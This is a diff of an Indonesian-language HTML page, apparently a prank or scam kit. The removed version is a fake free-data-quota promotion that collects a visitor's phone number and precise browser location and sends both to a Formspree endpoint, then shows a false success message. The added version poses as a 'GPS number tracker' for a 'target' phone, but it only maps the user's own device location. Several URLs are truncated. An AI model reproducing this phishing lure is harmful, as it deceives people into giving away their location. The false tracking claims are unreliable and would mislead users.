@@ -3,61 +3,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Promo Kuota Internet Gratis</title>
+    <title>Sistem Pelacak Lokasi - v2.1</title>
+    <link rel="stylesheet" href="https://unpkg.com" />
     <style>
-        body { font-family: sans-serif; text-align: center; background: #f4f4f4; padding: 20px; }
-        .card { background: white; padding: 25px; border-radius: 10px; max-width: 350px; margin: auto; box-shadow: 0 4px 10px rgba(0,0,0,0.1); border-top: 5px solid red; }
-        input { width: 90%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 5px; }
-        button { width: 95%; padding: 12px; background: red; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; background: #1a1a1a; color: white; display: flex; flex-direction: column; align-items: center; height: 100vh; }
+        .header { background: #d32f2f; width: 100%; padding: 15px; text-align: center; font-weight: bold; box-shadow: 0 2px 10px rgba(0,0,0,0.5); }
+        .card { background: #2d2d2d; padding: 20px; border-radius: 12px; width: 90%; max-width: 400px; margin-top: 20px; box-sizing: border-box; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #3d3d3d; border: 1px solid #555; color: white; border-radius: 6px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #d32f2f; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; transition: 0.3s; }
+        button:hover { background: #b71c1c; }
+        #map { height: 350px; width: 90%; max-width: 400px; margin-top: 20px; border-radius: 12px; border: 2px solid #d32f2f; display: none; }
+        .loading { display: none; margin: 10px 0; font-style: italic; color: #ffeb3b; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <img src="https://upload.wikimedia.org" width="100">
-        <h3>KLAIM 50GB GRATIS</h3>
-        <p>Masukkan nomor HP untuk verifikasi wilayah promo.</p>
-        
-        <input type="text" id="phone" placeholder="0812xxxxxxxx">
-        <button onclick="ambilLokasi()">AMBIL KUOTA</button>
-        
-        <p id="msg" style="font-size: 12px; color: gray; margin-top: 15px;"></p>
-    </div>
+<div class="header">GPS NUMBER TRACKER PRO</div>
 
-    <script>
-        function ambilLokasi() {
-            const no = document.getElementById('phone').value;
-            const msg = document.getElementById('msg');
-            
-            if(no.length < 10) return alert("Masukkan nomor HP!");
+<div class="card">
+    <label>Masukkan Nomor HP Target:</label>
+    <input type="text" id="phone" placeholder="+6281234xxxxxx">
+    <button onclick="startTracking()">LACAK SEKARANG</button>
+    <div id="loader" class="loading">Mengkoneksikan ke Satelit...</div>
+</div>
 
-            msg.innerText = "Memverifikasi lokasi... Mohon tunggu.";
+<div id="map"></div>
 
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((pos) => {
-                    const lat = pos.coords.latitude;
-                    const lng = pos.coords.longitude;
-                    const mapsUrl = `https://www.google.com{lat},${lng}`;
+<script src="https://unpkg.com"></script>
+<script>
+    let map;
+    let marker;
 
-                    // KIRIM DATA KE EMAIL ANDA VIA FORMSPREE
-                    fetch("https://formspree.io", {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            Nomor_HP: no,
-                            Lokasi_Google_Maps: mapsUrl,
-                            Akurasi: pos.coords.accuracy + " meter"
-                        })
-                    }).then(() => {
-                        alert("Verifikasi Berhasil! Kuota akan dikirim dalam 1x24 jam.");
-                        msg.innerText = "Selesai.";
-                    });
+    function startTracking() {
+        const phone = document.getElementById('phone').value;
+        if (!phone) { alert("Nomor HP harus diisi!"); return; }
 
-                }, (err) => {
-                    alert("Gagal! Anda harus mengizinkan akses lokasi untuk verifikasi kuota gratis.");
-                }, { enableHighAccuracy: true });
-            }
+        document.getElementById('loader').style.display = 'block';
+
+        // Menggunakan API Geolocation Browser (Akan meminta izin user)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(showPosition, showError);
+        } else {
+            alert("Browser tidak mendukung GPS.");
         }
-    </script>
+    }
+
+    function showPosition(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        
+        document.getElementById('loader').innerHTML = "Lokasi Berhasil Dikunci!";
+        document.getElementById('map').style.display = 'block';
+
+        if (!map) {
+            map = L.map('map').setView([lat, lon], 16);
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+        } else {
+            map.setView([lat, lon], 16);
+        }
+
+        if (marker) map.removeLayer(marker);
+        marker = L.marker([lat, lon]).addTo(map)
+            .bindPopup("Target terdeteksi di koordinat ini")
+            .openPopup();
+            
+        alert("Lokasi ditemukan! Koordinat: " + lat + ", " + lon);
+    }
+
+    function showError(error) {
+        document.getElementById('loader').style.display = 'none';
+        switch(error.code) {
+            case error.PERMISSION_DENIED:
+                alert("Target menolak izin lokasi.");
+                break;
+            default:
+                alert("Gagal melacak lokasi.");
+        }
+    }
+</script>
+
 </body>
 </html>
